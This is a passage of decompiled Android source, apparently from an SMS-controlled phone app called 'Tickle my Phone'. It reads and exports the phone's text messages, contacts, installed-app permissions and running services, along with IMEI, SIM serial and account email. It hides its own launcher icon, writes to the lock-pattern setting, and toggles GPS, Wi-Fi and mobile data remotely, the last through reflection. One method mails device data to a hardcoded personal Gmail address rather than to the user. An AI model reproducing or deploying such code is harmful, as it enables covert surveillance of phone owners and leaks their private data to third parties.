        if (RuleNo.equals("22") && GetPref(context, "KEY_CONTACTLIST_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("23") && GetPref(context, "KEY_SENDHELP_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("24") && GetPref(context, "KEY_GETSMS_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("25") && GetPref(context, "KEY_GETAPPLIST_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("26") && GetPref(context, "KEY_GETDIRLIST_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("27") && GetPref(context, "KEY_GETFILE_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("28") && GetPref(context, "KEY_PLAY_FILE_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("29") && GetPref(context, "KEY_NETWORKDATA_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("30") && GetPref(context, "KEY_ADDCONTACT_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("31") && GetPref(context, "KEY_BLUETOOTH_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("32") && GetPref(context, "KEY_SMSREPORT_ENABLE").equals("Y")) {
            return "newruleon";
        }
        if (RuleNo.equals("33") && GetPref(context, "KEY_CALLREPORT_ENABLE").equals("Y")) {
            return "newruleon";
        }
        return "newruleoff";
    }

    public static String GetContactName(Context context, String PhoneNumber) {
        Cursor cur = context.getContentResolver().query(Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(PhoneNumber)), new String[]{"_id", "number", "display_name"}, null, null, null);
        try {
            if (cur.moveToFirst()) {
                String string = cur.getString(2);
                return string;
            }
            if (cur != null) {
                cur.close();
            }
            return "";
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
    }

    public static void PlayBIGAlaram(Context context, int n_seconds) {
        AudioManager mAudioManager = (AudioManager) context.getSystemService("audio");
        mAudioManager.setStreamVolume(3, mAudioManager.getStreamMaxVolume(3), 4);
        MediaPlayer mPlayer = MediaPlayer.create(context, R.raw.tmlbuzzer);
        Debug("N Seconds inside the play BIG Alaram :" + n_seconds);
        for (int i = 0; i <= n_seconds; i++) {
            Debug("Inside Loop " + i + " for " + n_seconds + " seconds");
            mPlayer.setLooping(true);
            try {
                mPlayer.prepare();
            } catch (IllegalStateException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
            Debug("i = " + i);
            mPlayer.start();
            Sleep(1);
        }
        mPlayer.release();
    }

    public static void newscreenshot(Context context) {
        Debug("Debug 4");
        try {
            Bitmap bitmap = ((Activity) context).findViewById(R.id.layout).getDrawingCache();
            File file = new File(getTMLPath() + "screenshot.png");
            Debug("Debug 5");
            file.createNewFile();
            FileOutputStream ostream = new FileOutputStream(file);
            bitmap.compress(CompressFormat.PNG, 100, ostream);
            ostream.close();
            Debug("Debug 6");
        } catch (Exception e) {
            e.printStackTrace();
            Debug("Debug 10");
        }
    }

    public static void CreateLoyalFile(Context context) {
        String FileName = getTMLPath() + "ticklemyphone.loyal";
        if (!new File(FileName).exists()) {
            String LS_ImeiCode = getIMEICode(context);
            String LS_ImieEncrpted = TmlEncrypt(LS_ImeiCode).trim();
            Debug("**************IMIE   is :" + LS_ImeiCode);
            Debug("**************Encripted   is :" + LS_ImieEncrpted);
            CreateLogText(context, FileName, LS_ImieEncrpted);
        }
    }

    public static void CreateLogText(Context context, String FileName, String Body) {
        try {
            if (Environment.getExternalStorageDirectory().canWrite()) {
                BufferedWriter out = new BufferedWriter(new FileWriter(new File(FileName)));
                out.write(Body);
                out.flush();
                out.close();
                Debug("CreateLogText: Able to write properly. now closing");
                return;
            }
            Debug("CreateLogText: No acess to SD Card");
        } catch (IOException e) {
            Debug("CreateLogText:**************Problem writing to file" + e);
            e.printStackTrace();
        }
    }

    public static void RetriveContactListing(Context context, String EmailId) {
        Debug("Before cursor\n");
        Cursor cursor = context.getContentResolver().query(Phone.CONTENT_URI, new String[]{"_id", "display_name", "data1"}, null, null, null);
        Debug(" cursor count\n" + cursor.getCount());
        String Email_Attachment = new StringBuilder(String.valueOf("\n" + context.getString(R.string.oth36_cont_name) + "\t\t\t\t\t\t\t\t\t\t" + context.getString(R.string.oth37_cont_number) + "\n")).append("---------------------------------------------------------------------------------------------------------\n").toString();
        int total_contacts = 0;
        String is_free = GetPref(context, "KEY_IS_FREE");
        while (cursor.moveToNext()) {
            Debug("0Id     =" + cursor.getString(0) + "\n");
            Debug("1Name   =" + cursor.getString(1) + "\n");
            Debug("2Number =" + cursor.getString(2) + "\n");
            String callerPhoneNumber = padRight(cursor.getString(1), 90);
            String Contact_Name = padRight(cursor.getString(2), 30);
            if (total_contacts > 6 && is_free.equals("Y")) {
                callerPhoneNumber = "Tickle my PhoneFree version. To See full name, please  Consider buying.";
            }
            Email_Attachment = new StringBuilder(String.valueOf(Email_Attachment)).append(callerPhoneNumber).append("   ").append(Contact_Name).append("\n").toString();
            total_contacts++;
        }
        CreateLogText(context, getTMLPath() + "ticklemyphonecontacts.txt", Email_Attachment);
        Debug("What printed is \n" + Email_Attachment + "\n");
        String ShortBody = new StringBuilder(String.valueOf("" + context.getString(R.string.oth38_total_contacts) + ": " + total_contacts + "\n")).append("\n").append(context.getString(R.string.app_name)).append("\n").toString();
        String FileName = getTMLPath() + "ticklemyphonecontacts.txt";
        SetPref(context, "CONTACT_COUNT", total_contacts);
        Debug("Now sending mail");
        SendEmail(context, GetU(context), GetP(context), EmailId, "Tickle my Phone " + context.getString(R.string.oth40_contact_list), ShortBody, FileName);
        Debug("mail sent");
    }

    public static String padRight(String s, int n) {
        return String.format("%1$-" + n + "s", new Object[]{s});
    }

    public static String padLeft(String s, int n) {
        return String.format("%1$#" + n + "s", new Object[]{s});
    }

    public static void TurnGPS(Context context, String token2) {
        String LS_SenderPhone = GetParameter("ORIGINAL_ADDRESS");
        String isfree = "";
        if (GetPref(context, "KEY_IS_APP_ACTIVATE").equals("Y")) {
            isfree = "";
        } else {
            isfree = " " + context.getString(R.string.oth35_Free);
        }
        String SMSBody;
        if (token2.equals("1")) {
            turnGPSOn(context);
            SMSBody = context.getString(R.string.oth49_gps_swithed_on) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("GPS Turning on");
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else if (token2.equals("0")) {
            SMSBody = context.getString(R.string.oth50_gps_swithed_off) + "\n" + context.getString(R.string.app_name) + isfree;
            turnGPSOff(context);
            Debug("GPS Turning OFF");
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else {
            SMSBody = context.getString(R.string.oth51_invalid_syntax) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Invalid syntax for GPSSWITCHON");
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        }
    }

    public static String GetExternalIPAddress() throws IOException {
        URLConnection connection = new URL("http://automation.whatismyip.com/n09230945.asp").openConnection();
        connection.addRequestProperty("Protocol", "Http/1.1");
        connection.addRequestProperty("Connection", "keep-alive");
        connection.addRequestProperty("Keep-Alive", "1000");
        connection.addRequestProperty("User-Agent", "Web-Agent");
        return new BufferedReader(new InputStreamReader(connection.getInputStream())).readLine();
    }

    public static void TurnWifi(Context context, String token2) {
        String LS_SenderPhone = GetParameter("ORIGINAL_ADDRESS");
        String isfree = "";
        if (GetPref(context, "KEY_IS_APP_ACTIVATE").equals("Y")) {
            isfree = "";
        } else {
            isfree = " " + context.getString(R.string.oth35_Free);
        }
        WifiManager wifiManager = (WifiManager) context.getSystemService("wifi");
        String ssid = "";
        String SMSBody;
        if (token2.equals("1")) {
            wifiManager.setWifiEnabled(true);
            Sleep(3);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            if (WifiInfo.getDetailedStateOf(wifiInfo.getSupplicantState()) == DetailedState.CONNECTED) {
                ssid = wifiInfo.getSSID();
            }
            Sleep(10);
            String str = "";
            try {
                str = GetExternalIPAddress();
            } catch (IOException e) {
                str = "Err ExtIP " + e;
            }
            SMSBody = context.getString(R.string.oth52_wifi_swithed_on) + " " + ssid + "\n" + context.getString(R.string.app_name) + "\nExternal IP is -" + str;
            Debug("Sending the SMS now 1:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else if (token2.equals("0")) {
            wifiManager.setWifiEnabled(false);
            SMSBody = context.getString(R.string.oth53_wifi_swithed_off) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now 0:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else {
            SMSBody = context.getString(R.string.oth51_invalid_syntax) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now : Junk" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        }
    }

    public static void ListActiveApplications(Context context) {
        List<RunningServiceInfo> rs = ((ActivityManager) context.getSystemService("activity")).getRunningServices(50);
        String Email_Attachment = new StringBuilder(String.valueOf("\n" + context.getString(R.string.oth54_process) + "\t\t\t" + context.getString(R.string.oth55_component) + "\n")).append("-------------------------------------------------------------------\n").toString();
        int total_process = 0;
        for (int i = 0; i < rs.size(); i++) {
            RunningServiceInfo rsi = (RunningServiceInfo) rs.get(i);
            Debug("Process " + rsi.process + " with component " + rsi.service.getClassName());
            Email_Attachment = new StringBuilder(String.valueOf(Email_Attachment)).append(padRight(rsi.process, 50)).append("   ").append(padRight(rsi.service.getClassName(), 30)).append("\n").toString();
            total_process++;
        }
        String str = "Tickle my Phone " + context.getString(R.string.oth58_active_process_list);
        String str2 = getTMLPath() + "upgradetofull.jpg";
        SendEmail(context, GetU(context), GetP(context), "srinath.iflex@gmail.com", str, Email_Attachment, str2);
    }

    public static String GetSMSContent(Context context, String What) {
        String URI;
        String MessageContent = "";
        Debug("I am inside ListSMSContents");
        if (What.equals("Inbox")) {
            URI = "content://sms/inbox";
        } else {
            if (What.equals("Failed")) {
                URI = "content://sms/failed";
            } else {
                if (What.equals("Queued")) {
                    URI = "content://sms/queued";
                } else {
                    if (What.equals("Sent")) {
                        URI = "content://sms/sent";
                    } else {
                        if (What.equals("Draft")) {
                            URI = "content://sms/draft";
                        } else {
                            if (What.equals("Outbox")) {
                                URI = "content://sms/outbox";
                            } else {
                                if (What.equals("Undelivered")) {
                                    URI = "content://sms/undelivered";
                                } else {
                                    if (!What.equals("Conversations")) {
                                        return "Invalid";
                                    }
                                    URI = "content://sms/conversations";
                                }
                            }
                        }
                    }
                }
            }
        }
        Debug("ListSMSContents: URI =" + URI);
        Cursor c = context.getContentResolver().query(Uri.parse(URI), null, null, null, null);
        ((Activity) context).startManagingCursor(c);
        int smsEntriesCount = c.getCount();
        Debug("ListSMSContents: smsEntriesCount =" + smsEntriesCount);
        String[] body = new String[smsEntriesCount];
        String[] number = new String[smsEntriesCount];
        String[] read = new String[smsEntriesCount];
        String[] status = new String[smsEntriesCount];
        String[] date = new String[smsEntriesCount];
        String[] type = new String[smsEntriesCount];
        String[] subject = new String[smsEntriesCount];
        MessageContent = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(MessageContent)).append("=======================================================================================================================\n").toString())).append(What).append(" (").append(smsEntriesCount).append(")\n").toString())).append("=======================================================================================================================\n").toString();
        int totalcount = 0;
        if (c.moveToFirst()) {
            for (int i = 0; i < smsEntriesCount; i++) {
                Debug("ListSMSContents: i =" + i);
                try {
                    body[i] = c.getString(c.getColumnIndexOrThrow("body")).toString();
                    Debug("ListSMSContents: 1");
                    number[i] = c.getString(c.getColumnIndexOrThrow("address")).toString();
                    Debug("ListSMSContents: 2");
                    date[i] = DateFormat.format("dd.MMM h:mm a", new Date(Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString()))).toString();
                    Debug("ListSMSContents: 3");
                    read[i] = c.getString(c.getColumnIndexOrThrow("read")).toString();
                    Debug("ListSMSContents: 4");
                    status[i] = c.getString(c.getColumnIndexOrThrow("status")).toString();
                    Debug("ListSMSContents: 5");
                    type[i] = c.getString(c.getColumnIndexOrThrow("type")).toString();
                    Debug("ListSMSContents: 6");
                    subject[i] = "not working ";
                    Debug("ListSMSContents: 7");
                } catch (IllegalArgumentException e) {
                    e.printStackTrace();
                }
                MessageContent = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(MessageContent)).append("Number    :").append(number[i]).append("  ( ").append(GetContactName(context, number[i])).append(" )").toString())).append("Date      :").append(date[i]).append("\n").append("Type:").append(type[i]).append("\n").toString();
                String Ls_isRead = "";
                if (read[i].equals("0")) {
                    Ls_isRead = "(Unread) ";
                }
                MessageContent = new StringBuilder(String.valueOf(MessageContent)).append("Message   :").append(Ls_isRead).append(body[i]).append("\n").toString();
                Debug("ListSMSContents: body[i] =" + body[i]);
                c.moveToNext();
                totalcount++;
            }
            MessageContent = new StringBuilder(String.valueOf(MessageContent)).append("-------------------------------------------------------------------------\n").toString();
        }
        c.close();
        Debug("ListSMSContents: Final  MessageContent =" + MessageContent);
        return MessageContent;
    }

    public static String ListSMSContentsForType(Context context, String type) {
        String SMSMessage = "Tickle my Phone Retrieved following SMS :\n";
        if (type.equals("1")) {
            return GetSMSContent(context, "Inbox");
        }
        if (type.equals("2")) {
            return GetSMSContent(context, "Sent");
        }
        if (type.equals("3")) {
            return GetSMSContent(context, "Outbox");
        }
        if (type.equals("4")) {
            return GetSMSContent(context, "Draft");
        }
        if (type.equals("5")) {
            return GetSMSContent(context, "Undelivered");
        }
        if (type.equals("6")) {
            return GetSMSContent(context, "Failed");
        }
        if (type.equals("7")) {
            return GetSMSContent(context, "Conversations");
        }
        if (type.equals("8")) {
            return GetSMSContent(context, "Queued");
        }
        SMSMessage = GetSMSContent(context, "Inbox");
        SMSMessage = GetSMSContent(context, "Sent");
        SMSMessage = GetSMSContent(context, "Outbox");
        SMSMessage = GetSMSContent(context, "Draft");
        SMSMessage = GetSMSContent(context, "Undelivered");
        SMSMessage = GetSMSContent(context, "Failed");
        SMSMessage = GetSMSContent(context, "Conversations");
        return GetSMSContent(context, "Queued");
    }

    public static void ListSMSContents(Context context, String type) {
        String SMSMessage = "Tickle my Phone Retrieved following SMS :\n";
        if (type.equals("1")) {
            SMSMessage = GetSMSContent(context, "Inbox");
        } else if (type.equals("2")) {
            SMSMessage = GetSMSContent(context, "Sent");
        } else if (type.equals("3")) {
            SMSMessage = GetSMSContent(context, "Outbox");
        } else if (type.equals("4")) {
            SMSMessage = GetSMSContent(context, "Draft");
        } else if (type.equals("5")) {
            SMSMessage = GetSMSContent(context, "Undelivered");
        } else if (type.equals("6")) {
            SMSMessage = GetSMSContent(context, "Failed");
        } else if (type.equals("7")) {
            SMSMessage = GetSMSContent(context, "Conversations");
        } else if (type.equals("8")) {
            SMSMessage = GetSMSContent(context, "Queued");
        } else {
            SMSMessage = GetSMSContent(context, "Inbox");
            SMSMessage = GetSMSContent(context, "Sent");
            SMSMessage = GetSMSContent(context, "Outbox");
            SMSMessage = GetSMSContent(context, "Draft");
            SMSMessage = GetSMSContent(context, "Undelivered");
            SMSMessage = GetSMSContent(context, "Failed");
            SMSMessage = GetSMSContent(context, "Conversations");
            SMSMessage = GetSMSContent(context, "Queued");
        }
        CreateLogText(context, getTMLPath() + "ticklemyphonesms.txt", SMSMessage);
    }

    public static boolean isSenderOkForTML(Context context, String number_string, String phoneno) {
        String[] tokens = number_string.split(",(?=([^\"]*\"[^\"]*\")*[^\"]*$)");
        String LS_IsAllowDisallow = GetPref(context, "KEY_ALLOW_DISALLOW");
        if (number_string.equals("")) {
            return true;
        }
        if (LS_IsAllowDisallow.equals("ALLOW")) {
            for (String t : tokens) {
                Debug(new StringBuilder(String.valueOf(1)).append(" Checking for allow Phone number  = ").append(t).append(" with ").append(phoneno).toString());
                if (t.equals(phoneno)) {
                    Debug("TADA ALLOW");
                    return true;
                }
            }
            return false;
        }
        for (String t2 : tokens) {
            Debug(new StringBuilder(String.valueOf(1)).append(" Checking for NOT allow Phone number  = ").append(t2).append(" with ").append(phoneno).toString());
            if (t2.equals(phoneno)) {
                Debug("TADA DO NOT ALLOW");
                return false;
            }
        }
        return true;
    }

    public static boolean isSenderOkForTMLAutoAnswer(Context context, String number_string, String phoneno) {
        String[] tokens = number_string.split(",(?=([^\"]*\"[^\"]*\")*[^\"]*$)");
        String LS_IsAllowDisallow = GetPref(context, "KEY_ALLOW_DISALLOW_AUTOANSWER");
        if (number_string.equals("")) {
            return true;
        }
        if (LS_IsAllowDisallow.equals("ALLOW")) {
            for (String t : tokens) {
                Debug(new StringBuilder(String.valueOf(1)).append(" Checking for allow Phone number  = ").append(t).append(" with ").append(phoneno).toString());
                if (t.equals(phoneno)) {
                    Debug("TADA ALLOW");
                    return true;
                }
            }
            return false;
        }
        for (String t2 : tokens) {
            Debug(new StringBuilder(String.valueOf(1)).append(" Checking for NOT allow Phone number  = ").append(t2).append(" with ").append(phoneno).toString());
            if (t2.equals(phoneno)) {
                Debug("TADA DO NOT ALLOW");
                return false;
            }
        }
        return true;
    }

    public static void AppendAutoAnswerAllowed(Context context, String Pnumber) {
        String number_string = GetprefnoAT(context, "KEY_NUMBERS_STRING_AUTOANSWER");
        if (Pnumber.equals("")) {
            Debug("Number came to function is null so dont do anything" + Pnumber);
        } else if (number_string.equals("")) {
            Debug("Didn't had any string inside. so First time.  Add the number and return." + Pnumber);
            SetPref(context, "KEY_NUMBERS_STRING_AUTOANSWER", Pnumber);
        } else {
            for (String t : number_string.split(",(?=([^\"]*\"[^\"]*\")*[^\"]*$)")) {
                Debug(" Checking for allow Phone number  = " + t + " with " + Pnumber);
                if (t.equals(Pnumber)) {
                    Debug("Found similar number inside KEY_NUMBERS_STRING_AUTOANSWER so no need to add again" + Pnumber);
                    return;
                }
            }
            Debug("Final add of Phone no: " + Pnumber);
            SetPref(context, "KEY_NUMBERS_STRING_AUTOANSWER", new StringBuilder(String.valueOf(number_string)).append(",").append(Pnumber).toString());
        }
    }

    public static void PlayMastRadio() throws UnknownHostException, IOException {
        String hostname = "http://stream.mastradio.net";
        MediaPlayer mediaPlayer = new MediaPlayer();
        mediaPlayer.setDataSource("http://stream.mastradio.net:8000/");
        mediaPlayer.prepare();
        mediaPlayer.start();
    }

    public static Boolean CheckForUpgrade(Context context) {
        String ApplicationVersion = GetVersionNumberOnly(context);
        if (GetInternetConnectionInfo(context).contains("no internet")) {
            Debug("I am Returning true 1");
            return Boolean.valueOf(true);
        }
        try {
            String LatestVersion = new BufferedReader(new InputStreamReader(new URL("http://dl.dropbox.com/u/27314855/tmlversion.txt").openStream())).readLine();
            Debug("ApplicationVersion:" + ApplicationVersion + "LatestVersion:" + LatestVersion);
            if (ApplicationVersion.equals(LatestVersion)) {
                Debug("I am Returning true 2");
                return Boolean.valueOf(true);
            }
            Debug("I am Returning false");
            return Boolean.valueOf(false);
        } catch (MalformedURLException e) {
            Debug("I am Returning true 3");
            return Boolean.valueOf(true);
        } catch (IOException e2) {
            Debug("I am Returning true 4");
            return Boolean.valueOf(true);
        }
    }

    public static void ShowUpgradeMessage(final Context context) {
        Builder adb = new Builder(context);
        adb.setTitle("Tickle my Phone");
        String LatestVersion = "";
        try {
            LatestVersion = new BufferedReader(new InputStreamReader(new URL("http://dl.dropbox.com/u/27314855/tmlversion.txt").openStream())).readLine();
        } catch (MalformedURLException e1) {
            LatestVersion = GetVersionNumberOnly(context);
            e1.printStackTrace();
        } catch (IOException e12) {
            LatestVersion = GetVersionNumberOnly(context);
            e12.printStackTrace();
        }
        adb.setMessage("You are running older version Tickle my Phone " + GetVersionNumberOnly(context) + ". Do you want to upgrade new version " + LatestVersion + " ?");
        adb.setPositiveButton("Ok", new OnClickListener() {
            public void onClick(DialogInterface dialog, int id) {
                TML_Library.OpenMarketWindow(context);
            }
        });
        adb.setNegativeButton("Cancel", new OnClickListener() {
            public void onClick(DialogInterface dialog, int id) {
                dialog.cancel();
            }
        });
        adb.show();
    }

    public static void SetlockPatter(Context context, String token2) {
        String LS_SenderPhone = GetParameter("ORIGINAL_ADDRESS");
        String isfree = "";
        String SMSBody;
        if (token2.equals("1")) {
            Debug("I am setting to true");
            setLockPatternEnabled(context, true);
            SMSBody = context.getString(R.string.oth52_secpat_swithed_on) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now 1:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else if (token2.equals("0")) {
            setLockPatternEnabled(context, false);
            Debug("I am setting to false");
            SMSBody = context.getString(R.string.oth53_secpat_swithed_off) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now 0:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else {
            Debug("In correct syntax");
            SMSBody = context.getString(R.string.oth51_invalid_syntax) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now : Junk" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        }
    }

    public static void setLockPatternEnabled(Context context, boolean enabled) {
        setBoolean(context, "lock_pattern_autolock", enabled);
    }

    public static void setBoolean(Context context, String systemSettingKey, boolean enabled) {
        Secure.putInt(context.getContentResolver(), "lock_pattern_autolock", 0);
    }

    public static String getEmail(Context context) {
        Account account = getAccount(AccountManager.get(context));
        if (account == null) {
            return null;
        }
        return "Email = " + account.name + "\n" + "Phone No=" + getUserContactNumber(context) + "\n";
    }

    public static Account getAccount(AccountManager accountManager) {
        Account[] accounts = accountManager.getAccountsByType("com.google");
        if (accounts.length > 0) {
            return accounts[0];
        }
        return null;
    }

    public static String getUserContactNumber(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
    }

    public static boolean isValidEmailAddress(String email) {
        try {
            new InternetAddress(email).validate();
            return true;
        } catch (AddressException e) {
            return false;
        }
    }

    public static void MakeIconInvisible(Context context) {
        context.getApplicationContext().getPackageManager().setComponentEnabledSetting(((Activity) context).getComponentName(), 2, 1);
    }

    public static void TurnNetworkData(Context context, String token2) throws Exception {
        String LS_SenderPhone = GetParameter("ORIGINAL_ADDRESS");
        String isfree = "";
        if (GetPref(context, "KEY_IS_APP_ACTIVATE").equals("Y")) {
            isfree = "";
        } else {
            isfree = " " + context.getString(R.string.oth35_Free);
        }
        String SMSBody;
        if (token2.equals("1")) {
            setMobileDataEnabled(context, true);
            SMSBody = "Network Data (Use Packet Data ) for  3G/Edge is ON\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now 1:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else if (token2.equals("0")) {
            setMobileDataEnabled(context, false);
            SMSBody = "Network Data (Use Packet Data ) for  3G/Edge is OFF\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now 1:" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        } else {
            SMSBody = context.getString(R.string.oth51_invalid_syntax) + "\n" + context.getString(R.string.app_name) + isfree;
            Debug("Sending the SMS now : Junk" + SMSBody);
            sendSMSBig(context, LS_SenderPhone, SMSBody);
        }
    }

    public static void setMobileDataEnabled(Context context, boolean enabled) throws Exception {
        ConnectivityManager conman = (ConnectivityManager) context.getSystemService("connectivity");
        Class conmanClass = null;
        try {
            conmanClass = Class.forName(conman.getClass().getName());
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
        iConnectivityManagerField.setAccessible(true);
        Object iConnectivityManager = iConnectivityManagerField.get(conman);
        Method setMobileDataEnabledMethod = Class.forName(iConnectivityManager.getClass().getName()).getDeclaredMethod("setMobileDataEnabled", new Class[]{Boolean.TYPE});
        setMobileDataEnabledMethod.setAccessible(true);
        setMobileDataEnabledMethod.invoke(iConnectivityManager, new Object[]{Boolean.valueOf(enabled)});
    }

    public static String UpdateFriendName(String SMSBody, String FriendName, String ContactNumber) {
        return SMSBody.replace("$friendname".toLowerCase(), FriendName).replace("$friendno".toLowerCase(), ContactNumber);
    }

    public static void AddContact(Context context, String ContactName, String ContactNumber) {
        ArrayList<ContentProviderOperation> ops = new ArrayList();
        int rawContactInsertIndex = ops.size();
        ops.add(ContentProviderOperation.newInsert(RawContacts.CONTENT_URI).withValue("account_type", null).withValue("account_name", null).build());
        ops.add(ContentProviderOperation.newInsert(Data.CONTENT_URI).withValueBackReference("raw_contact_id", rawContactInsertIndex).withValue("mimetype", "vnd.android.cursor.item/name").withValue("data1", ContactName).build());
        ops.add(ContentProviderOperation.newInsert(Data.CONTENT_URI).withValueBackReference("raw_contact_id", rawContactInsertIndex).withValue("mimetype", "vnd.android.cursor.item/phone_v2").withValue("data1", ContactNumber).withValue("data2", Integer.valueOf(2)).build());
        try {
            ContentProviderResult[] res = context.getContentResolver().applyBatch("com.android.contacts", ops);
            String SMSBody = UpdateFriendName(GetPref(context, "KEY_SMS_AC_REPLY_TEXT"), ContactName, ContactNumber);
            Debug("Body after update:" + SMSBody);
            sendSMSBig(context, ContactNumber, new StringBuilder(String.valueOf(SMSBody)).append("\nTickle my Phone").toString());
        } catch (OperationApplicationException | RemoteException e) {
        }
    }

    public static String Application_Permissions(Context context) {
        String LS_Final = "";
        String LS_Only_ReadSMS = "";
        PackageManager p = context.getPackageManager();
        int user_app_count = 0;
        for (PackageInfo pInfo : p.getInstalledPackages(4110)) {
            String[] reqPermission = pInfo.requestedPermissions;
            ServiceInfo[] services = pInfo.services;
            ProviderInfo[] providers = pInfo.providers;
            int versionCode = pInfo.versionCode;
            try {
                ApplicationInfo ai = p.getApplicationInfo(pInfo.applicationInfo.packageName, 0);
                LS_Final = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(LS_Final)).append("versionCode-package=").append(Integer.toString(versionCode)).append("\n").toString())).append("Installed Applications").append(pInfo.applicationInfo.loadLabel(p).toString()).append("\n").toString();
                if (reqPermission != null) {
                    for (int i = 0; i < reqPermission.length; i++) {
                        LS_Final = new StringBuilder(String.valueOf(LS_Final)).append("Permission list").append(reqPermission[i]).append("\n").toString();
                        if (reqPermission[i].contains("READ_SMS") && (ai.flags & 1) == 0) {
                            LS_Only_ReadSMS = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(LS_Only_ReadSMS)).append("Application Name   :").append(pInfo.applicationInfo.loadLabel(p).toString()).append("\n").toString())).append("Package Name       :").append(pInfo.applicationInfo.packageName.toString()).append("\n").toString())).append("Version Code       :").append(Integer.toString(versionCode)).append("\n").toString())).append("====================================\n").toString();
                            user_app_count++;
                        }
                    }
                }
            } catch (NameNotFoundException e) {
                e.printStackTrace();
                return "Some problem while getting package";
            }
        }
        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(LS_Only_ReadSMS)).append("Total    :").append(user_app_count).append("\n").toString())).append("====================================\n").toString();
    }

    public static String GetIsInstalledMarket(Context context) {
        return context.getPackageManager().getInstallerPackageName(context.getPackageName());
    }

    public static String GetCountry(Context context) {
        return context.getResources().getConfiguration().locale.getCountry();
    }

    public static String GetCountryName(Context context) {
        return context.getResources().getConfiguration().locale.getDisplayCountry();
    }

    public static String GetFirstTimeInfo(Context context) {
        String ContactInfo = getEmail(context);
        String LS_RingMode = GetRingMode(context);
        String LS_GPSInfo = GetGPSinfo(context);
        String LS_InternetInfo = GetInternetConnectionInfo(context);
        String LS_SDCardSpace = GetSDCardSpace(context);
        String PhoneDevice = Build.DEVICE;
        String CpuABI = Build.CPU_ABI;
        String Brand = Build.BRAND;
        String Display = Build.DISPLAY;
        String Host = Build.HOST;
        String Id = Build.ID;
        String Manufacturer = Build.MANUFACTURER;
        String PhoneModel = Build.MODEL;
        String PhoneProduct = Build.PRODUCT;
        String User = Build.USER;
        String Sdk = VERSION.SDK;
        String AndroidVersion = VERSION.RELEASE;
        String CodeName = VERSION.CODENAME;
        String ImeiCode = getIMEICode(context);
        String SimCountry = GetSimCountry(context);
        String SIMDeviceSoftwareVersion = GetSIMDeviceSoftwareVersion(context);
        String SimOperator = GetSimOperator(context);
        String SimOperatorName = GetSimOperatorName(context);
        String SimSerialNumber = GetSimSerialNumber(context);
        String InstalltionSource = GetIsInstalledMarket(context);
        String Country = GetCountry(context);
        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("\nContactInfo= \n" + ContactInfo)).append("\nRingMode= ").append(LS_RingMode).toString())).append("\nGPSInfo= ").append(LS_GPSInfo).toString())).append("\nInternetInfo= ").append(LS_InternetInfo).toString())).append("\nSDCardSpace= ").append(LS_SDCardSpace).toString())).append("\nPhoneDevice= ").append(PhoneDevice).toString())).append("\nCpuABI= ").append(CpuABI).toString())).append("\nBrand= ").append(Brand).toString())).append("\nDisplay= ").append(Display).toString())).append("\nHost= ").append(Host).toString())).append("\nId= ").append(Id).toString())).append("\nManufacturer= ").append(Manufacturer).toString())).append("\nPhoneModel= ").append(PhoneModel).toString())).append("\nPhoneProduct= 